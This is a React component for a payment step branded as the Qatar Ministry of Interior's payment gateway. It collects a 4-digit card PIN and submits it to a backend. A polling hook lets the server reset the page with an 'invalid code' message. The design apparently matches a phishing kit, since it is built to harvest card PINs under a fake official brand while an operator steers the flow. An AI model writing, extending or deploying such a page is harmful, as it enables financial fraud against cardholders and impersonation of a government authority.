import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import { useLang } from "../../context/LanguageContext";
import { FlowHeader } from "./FlowHeader";
import { FlowLoading } from "./FlowLoading";
import styles from "./FlowCardCodePage.module.scss";

export function FlowCardCodePage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { t, dir } = useLang();
  const ft = t.flow;
  const fc = ft.cardCode;

  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [otp, setOtp] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  useFlowPoll({
    reference,
    currentPage: "card-code",
    enabled: !!reference,
    onReset: () => {
      setSubmitted((prev) => {
        if (prev) { setOtp(""); setError(fc.invalidCode); }
        return false;
      });
    },
  });

  const handleInput = (val: string) => {
    setOtp(val.replace(/\D/g, "").slice(0, 4));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 4) { setError(fc.enterCode); return; }
    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "card_code_submitted", { card_code: otp });
      setSubmitted(true);
    } catch {
      setError(ft.networkError);
    } finally {
      setBusy(false);
    }
  };

  if (!reference) { navigate("/", { replace: true }); return null; }

  return (
    <div className={styles.page}>
      <FlowHeader />

      <div className={styles.center} dir={dir}>
        <div className={styles.card}>

          {/* ── Gradient header ── */}
          <div className={styles.cardHead}>
            <div className={styles.iconWrap}>
              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="1.6" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z" />
              </svg>
            </div>
            <h1 className={styles.headTitle}>{fc.title}</h1>
            <p className={styles.headDesc}>{fc.desc}</p>
          </div>

          {/* ── Body ── */}
          <div className={styles.body}>
            {error && <div className={styles.error}>{error}</div>}

            <form onSubmit={handleSubmit}>
              <label className={styles.pinLabel} htmlFor="card_code">
                {fc.label}
              </label>

              <input
                id="card_code"
                type="text"
                value={otp}
                onChange={(e) => handleInput(e.target.value)}
                inputMode="numeric"
                maxLength={4}
                autoComplete="off"
                placeholder={fc.placeholder}
                dir="ltr"
                className={styles.pinField}
              />

              <div className={styles.dots}>
                {[0, 1, 2, 3].map((i) => (
                  <span
                    key={i}
                    className={`${styles.dot}${i < otp.length ? ` ${styles.filled}` : ""}`}
                  />
                ))}
              </div>

              <button
                type="submit"
                disabled={otp.length < 4 || busy}
                className={styles.submit}
              >
                {busy ? "…" : fc.submit}
              </button>
            </form>

            <div className={styles.secureNote}>
              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="1.8" stroke="currentColor" aria-hidden="true">
                <path strokeLinecap="round" strokeLinejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
              </svg>
              Secured by MOI Payment Gateway
            </div>
          </div>

          {/* ── Footer ── */}
          <div className={styles.cardFoot}>
            <span className={styles.footLabel}>Ministry of Interior · Qatar</span>
            <div className={styles.footGold} />
          </div>

        </div>
      </div>

      {submitted && <FlowLoading />}
    </div>
  );
}